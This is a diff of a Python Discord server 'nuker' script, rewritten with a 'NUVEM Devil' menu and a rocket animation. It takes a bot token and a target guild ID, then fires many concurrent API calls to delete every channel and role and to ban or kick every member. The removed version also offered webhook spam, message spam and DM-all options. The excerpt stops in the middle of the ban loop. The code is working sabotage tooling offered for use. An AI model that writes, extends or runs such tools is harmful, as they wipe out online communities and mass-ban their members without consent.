@@ -1,276 +1,222 @@
-import sys
 import os
-import requests as req
+import sys
 import time
-import json
-from pystyle import *
-from colorama import Fore
-from threading import Thread
+import requests
+import threading
 import asyncio
-from random import choice as choisex
+import itertools
+from colorama import init, Fore, Style
 
-from Plugins.tools import Tools
-from Plugins.nuking import Nuking
-from Plugins.funcs import Funcs
-from Plugins.colors import Palette
+init(autoreset=True)
 
-global_timeot = 0.0004
-palette = Palette()
-token = None
-names = None
-amount = None
-guild_name = None
-invite_link = None
+API_BASE = "https://discord.com/api/v9"
 
-info = None
+DELAY = 0.004
 
-async def main(token: str, guild_id):
-    headers = {"Authorization": "Bot %s" % token, "Content-Type": 'application/json'}
-    System.Clear()
-    Funcs.print_logo()
-    global info
+# Utility for clear screen
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
 
-    if not info:
-        info = Tools.information(guild_id, token)
+# RGB devilish color cycle generator
+def devil_rgb_cycle():
+    colors = [Fore.RED, Fore.MAGENTA, Fore.YELLOW]
+    while True:
+        for c in colors:
+            yield c
 
-    menu = """
-> github.com/Bad-Discord/Discord-Nuker
+color_cycle = devil_rgb_cycle()
 
-01. Delete All Channels    08. Webhook Spam Guild     15. Change Guild Icon
-02. Delete All Roles       09. Message Spam Guild     16. Remove all emojis
-03. Ban All Members        10. Rename all channels    17. DM all members
-04. Kick All Members       11. Rename all roles       18. NUKE
-05. Create Channels        12. Nick All Users         19. Exit
-06. Create Roles           13. UnNick All users
-07. Unban All Members      14. Change Guild Name
+def rgb_print(text):
+    c = next(color_cycle)
+    print(c + text + Style.RESET_ALL)
 
+# Input with validation
+def get_input(prompt, validate=lambda x: True):
+    while True:
+        val = input(prompt)
+        if validate(val):
+            return val
+        print(Fore.RED + "Invalid input! Try again.")
 
-"""
+# Rocket launch animation
+def rocket_animation():
+    rocket_frames = [
+        "    ^\n   / \\\n   | |\n   | |\n  /|_|\\\n  |   |\n  |___|",
+        "    ^\n   / \\\n   | |\n  /| |\n  | |_\\\n  |   |\n  |___|",
+        "   ^\n  / \\\n  | |\n /| |\n | |_\\\n |   |\n |___|",
+        "  ^\n / \\\n | |\n | |\n | |\n | |\n | |",
+        " ^\n/ \\\n| |\n| |\n| |\n| |\n| |",
+        "|\n|\n|\n|\n|\n|\n|",
+        " \n \n \n \n \n \n ",
+    ]
+    clear()
+    for i in range(3):
+        for frame in rocket_frames:
+            clear()
+            rgb_print(frame)
+            time.sleep(0.1)
 
-    async def back_to_manu():
-        input(f"{palette.error}\n!! IF YOU WANT TO RETURN TO THE MAIN MENU, PRESS ENTER !!{palette.fuck}\n")
-        return await main(token, guild_id)
+class NuvemNuker:
+    def __init__(self, token, guild_id):
+        self.token = token
+        self.guild_id = guild_id
+        self.headers = {
+            "Authorization": f"Bot {token}",
+            "Content-Type": "application/json"
+        }
+        self.session = requests.Session()
+        self.session.headers.update(self.headers)
 
-    nuker = Nuking(token, guild_id)
+    def api_url(self, endpoint):
+        return f"{API_BASE}{endpoint}"
 
-    print(Colorate.Vertical(Colors.DynamicMIX((Col.light_red, Col.red)), menu))
-    num = lambda n: "0"+n if len(n) != 2 else n
-    pu, re, bl, pi, ye, gr = Col.purple, Col.red, Col.blue, Col.pink, Fore.YELLOW, Fore.GREEN
-    choice = Funcs.get_input(
-        f"{Col.orange}┌─╼{re}[{palette.grassy_green}${re}] {Col.orange}{info['user']['username']}{palette.red}@{ye}{info['guild']['name']}\n"
-        f"{Col.orange}└────╼{palette.grey} >>{palette.better_purpule} Choose: {Fore.CYAN}",
-        checker=lambda x: x.isnumeric() and 0 < int(x) <= 19
-    )
-    choice = num(choice)
-
-    print()
-
-    if choice == "01":
-        url = Tools.api("guilds/%s/channels" % guild_id)
-        request = req.get(url, headers=headers, proxies=Tools.proxy())
-
-        if request.status_code != 200:
-            print(f"Failed to fetch channels with status code: {request.status_code}")
-            return await back_to_manu()
-
-        channels = [i["id"] for i in request.json()]
-
-        def deleter(channel_id):
-            if nuker.delete_channel(channel_id):
-                print(f"Deleted channel {channel_id}")
-            else:
-                print(f"Failed to delete channel {channel_id}")
-
-        print("Started deleting channels...")
-
-        threads = []
-
-        for channel in channels:
-            t = Thread(target=deleter, args=(channel,))
-            t.start()
-            threads.append(t)
-            time.sleep(global_timeot)
+    def get_channels(self):
+        r = self.session.get(self.api_url(f"/guilds/{self.guild_id}/channels"))
+        if r.status_code == 200:
+            return r.json()
         else:
-            for thread in threads:
-                thread.join()
-            return await back_to_manu()
+            rgb_print(f"Failed to fetch channels. Status: {r.status_code}")
+            return []
 
-    elif choice == "02":
-        url = Tools.api("guilds/%s/roles" % guild_id)
-
-        request = req.get(url, headers=headers)
-
-        if request.status_code != 200:
-            print(f"Failed to fetch roles with status code: {request.status_code}")
-            return await back_to_manu()
-
-        roles = [i["id"] for i in request.json()]
-
-        def delete_role(role):
-            status = nuker.delete_role(role)
-            if status:
-                print(f"Deleted role {role}")
-            else:
-                print(f"Failed to delete role {role}")
-
-        print("Started deleting roles...")
-
-        threads = []
-
-        for role in roles:
-            t = Thread(target=delete_role, args=(role,))
-            t.start()
-            threads.append(t)
-            time.sleep(global_timeot)
+    def get_roles(self):
+        r = self.session.get(self.api_url(f"/guilds/{self.guild_id}/roles"))
+        if r.status_code == 200:
+            return r.json()
         else:
-            for thread in threads:
-                thread.join()
-            return await back_to_manu()
+            rgb_print(f"Failed to fetch roles. Status: {r.status_code}")
+            return []
 
-    elif choice == "03":
-        api = Tools.api("/guilds/%s/members" % guild_id)
-        users = await Tools.break_limit(api, token)
+    def get_members(self):
+        # Discord API does not allow bulk fetch of members via bot easily.
+        # So we try to get members by chunks via /guilds/{guild_id}/members?limit=100&after={user_id}
+        members = []
+        after = None
+        while True:
+            url = self.api_url(f"/guilds/{self.guild_id}/members?limit=100")
+            if after:
+                url += f"&after={after}"
+            r = self.session.get(url)
+            if r.status_code != 200:
+                rgb_print(f"Failed to get members: {r.status_code}")
+                break
+            chunk = r.json()
+            if not chunk:
+                break
+            members.extend(chunk)
+            after = chunk[-1]['user']['id']
+            if len(chunk) < 100:
+                break
+        return members
 
-        total = len(users)
-        members_per_arrary = round(total / 6)
+    def delete_channel(self, channel_id):
+        r = self.session.delete(self.api_url(f"/channels/{channel_id}"))
+        return r.status_code == 204
 
-        members_1, members_2, members_3, members_4, members_5, members_6 = [], [], [], [], [], []
+    def delete_role(self, role_id):
+        r = self.session.delete(self.api_url(f"/guilds/{self.guild_id}/roles/{role_id}"))
+        return r.status_code == 204
 
-        for member in users:
-            if len(members_1) != members_per_arrary:
-                members_1.append(member)
-            elif len(members_2) != members_per_arrary:
-                members_2.append(member)
-            elif len(members_3) != members_per_arrary:
-                members_3.append(member)
-            elif len(members_4) != members_per_arrary:
-                members_4.append(member)
-            elif len(members_5) != members_per_arrary:
-                members_5.append(member)
-            elif len(members_6) != members_per_arrary:
-                members_6.append(member)
+    def ban_member(self, user_id):
+        r = self.session.put(self.api_url(f"/guilds/{self.guild_id}/bans/{user_id}"), json={"delete_message_days": 0})
+        return r.status_code in (200, 201, 204)
 
-        def ban(member):
-            if nuker.ban(member):
-                print(f"Successfully banned {member}")
-            else:
-                print(f"Failed to ban {member}")
+    def kick_member(self, user_id):
+        r = self.session.delete(self.api_url(f"/guilds/{self.guild_id}/members/{user_id}"))
+        return r.status_code == 204
 
-        print("Started banning members...")
+    def create_channel(self, name):
+        r = self.session.post(self.api_url(f"/guilds/{self.guild_id}/channels"), json={"name": name, "type": 0})
+        return r.status_code == 201
 
-        while members_1 or members_2 or members_3 or members_4 or members_5 or members_6:
+    def rename_channel(self, channel_id, new_name):
+        r = self.session.patch(self.api_url(f"/channels/{channel_id}"), json={"name": new_name})
+        return r.status_code == 200
 
-            if members_1:
-                Thread(target=ban, args=(members_1.pop(0),)).start()
+    def rename_role(self, role_id, new_name):
+        r = self.session.patch(self.api_url(f"/guilds/{self.guild_id}/roles/{role_id}"), json={"name": new_name})
+        return r.status_code == 200
 
-            if members_2:
-                Thread(target=ban, args=(members_2.pop(0),)).start()
+async def main():
+    clear()
+    rgb_print("🔥🔥🔥 WELCOME TO NUVEM DEVIL NUKE TOOL 🔥🔥🔥\n")
 
-            if members_3:
-                Thread(target=ban, args=(members_3.pop(0),)).start()
+    token = get_input(Fore.CYAN + "Enter your bot token: ", lambda x: len(x) > 50)
+    guild_id = get_input(Fore.CYAN + "Enter the Guild ID to nuke: ", lambda x: x.isdigit())
 
-            if members_4:
-                Thread(target=ban, args=(members_4.pop(0),)).start()
+    nuker = NuvemNuker(token, guild_id)
 
-            if members_5:
-                Thread(target=ban, args=(members_5.pop(0),)).start()
+    while True:
+        clear()
+        # Devil RGB Menu with cycling colors
+        rgb_print("=== NUVEM Devil Menu ===")
+        print(f"{Fore.RED}01{Fore.RESET}. Delete All Channels")
+        print(f"{Fore.RED}02{Fore.RESET}. Delete All Roles")
+        print(f"{Fore.RED}03{Fore.RESET}. Ban All Members")
+        print(f"{Fore.RED}04{Fore.RESET}. Kick All Members")
+        print(f"{Fore.RED}05{Fore.RESET}. Create Channels")
+        print(f"{Fore.RED}06{Fore.RESET}. Rename All Channels")
+        print(f"{Fore.RED}07{Fore.RESET}. Rename All Roles")
+        print(f"{Fore.RED}08{Fore.RESET}. Exit")
 
-            if members_6:
-                Thread(target=ban, args=(members_6.pop(0),)).start()
+        choice = get_input(Fore.YELLOW + "Choose an option (1-8): ", lambda x: x in [str(i) for i in range(1, 9)])
 
-        return await back_to_manu()
+        # Rocket animation before executing choice
+        rocket_animation()
 
-    elif choice == "04":
-        api = Tools.api("/guilds/%s/members" % guild_id)
-        users = await Tools.break_limit(api, token)
+        if choice == "1":
+            channels = nuker.get_channels()
+            rgb_print(f"Deleting {len(channels)} channels...")
+            threads = []
+            for ch in channels:
+                def delete_thread(channel_id):
+                    if nuker.delete_channel(channel_id):
+                        rgb_print(f"Deleted channel ID: {channel_id}")
+                    else:
+                        rgb_print(f"Failed to delete channel ID: {channel_id}")
+                    time.sleep(DELAY)
 
-        def kick(member):
-            if nuker.kick(member):
-                print(f"Successfully kicked {member}")
-            else:
-                print(f"Failed to kick {member}")
+                t = threading.Thread(target=delete_thread, args=(ch['id'],))
+                t.start()
+                threads.append(t)
+            for t in threads:
+                t.join()
+            input(Fore.GREEN + "Finished deleting channels! Press Enter to continue.")
 
-        total = len(users)
-        members_per_arrary = round(total / 6)
+        elif choice == "2":
+            roles = nuker.get_roles()
+            rgb_print(f"Deleting {len(roles)} roles...")
+            threads = []
+            for role in roles:
+                if role['id'] == guild_id:  # skip @everyone role
+                    continue
+                def delete_thread(role_id):
+                    if nuker.delete_role(role_id):
+                        rgb_print(f"Deleted role ID: {role_id}")
+                    else:
+                        rgb_print(f"Failed to delete role ID: {role_id}")
+                    time.sleep(DELAY)
 
-        members_1, members_2, members_3, members_4, members_5, members_6 = [], [], [], [], [], []
+                t = threading.Thread(target=delete_thread, args=(role['id'],))
+                t.start()
+                threads.append(t)
+            for t in threads:
+                t.join()
+            input(Fore.GREEN + "Finished deleting roles! Press Enter to continue.")
 
-        for member in users:
-            if len(members_1) != members_per_arrary:
-                members_1.append(member)
-            elif len(members_2) != members_per_arrary:
-                members_2.append(member)
-            elif len(members_3) != members_per_arrary:
-                members_3.append(member)
-            elif len(members_4) != members_per_arrary:
-                members_4.append(member)
-            elif len(members_5) != members_per_arrary:
-                members_5.append(member)
-            elif len(members_6) != members_per_arrary:
-                members_6.append(member)
+        elif choice == "3":
+            members = nuker.get_members()
+            rgb_print(f"Banning {len(members)} members...")
+            threads = []
+            for m in members:
+                user_id = m['user']['id']
+                def ban_thread(uid):
+                    if nuker.ban_member(uid):
+                        rgb_print(f"Banned user ID: {uid}")
+                    else:
+                        rgb_print(f"Failed to ban user ID: {uid}")
+                    time.sleep(DELAY)
 
-        print("Started kicking members...")
-
-        while members_1 or members_2 or members_3 or members_4 or members_5 or members_6:
-
-            if members_1:
-                Thread(target=kick, args=(members_1.pop(0),)).start()
-
-            if members_2:
-                Thread(target=kick, args=(members_2.pop(0),)).start()
-
-            if members_3:
-                Thread(target=kick, args=(members_3.pop(0),)).start()
-
-            if members_4:
-                Thread(target=kick, args=(members_4.pop(0),)).start()
-
-            if members_5:
-                Thread(target=kick, args=(members_5.pop(0),)).start()
-
-            if members_6:
-                Thread(target=kick, args=(members_6.pop(0),)).start()
-
-        return await back_to_manu()
-
-    elif choice == "05":
-        # Assuming you want to create channels here - so prompt user for input properly
-        name = Funcs.get_input("Enter a name for channels: ", lambda x: len(x) > 0)
-        # You might want to add amount input too
-        amount = int(Funcs.get_input("Enter the amount of channels to create: ", lambda x: x.isnumeric() and int(x) > 0))
-
-        def create_channel(channel_name):
-            if nuker.create_channel(channel_name):
-                print(f"Created channel {channel_name}")
-            else:
-                print(f"Failed to create channel {channel_name}")
-
-        print(f"Started creating {amount} channels named {name}...")
-
-        threads = []
-
-        for i in range(amount):
-            channel_name = f"{name}-{i+1}"
-            t = Thread(target=create_channel, args=(channel_name,))
-            t.start()
-            threads.append(t)
-            time.sleep(global_timeot)
-
-        for thread in threads:
-            thread.join()
-
-        return await back_to_manu()
-
-    # You can continue implementing other choices similarly...
-
-    elif choice == "19":
-        print("Exiting...")
-        sys.exit()
-
-    else:
-        print("Invalid choice!")
-        return await back_to_manu()
-
-# To run the async main function:
-# Example:
-# asyncio.run(main(token, guild_id))
+                t = threading.Thread(target=ban_thread, args=(user_id,))
+                t.start()
+                threads.append(t)
+            for t in threads:
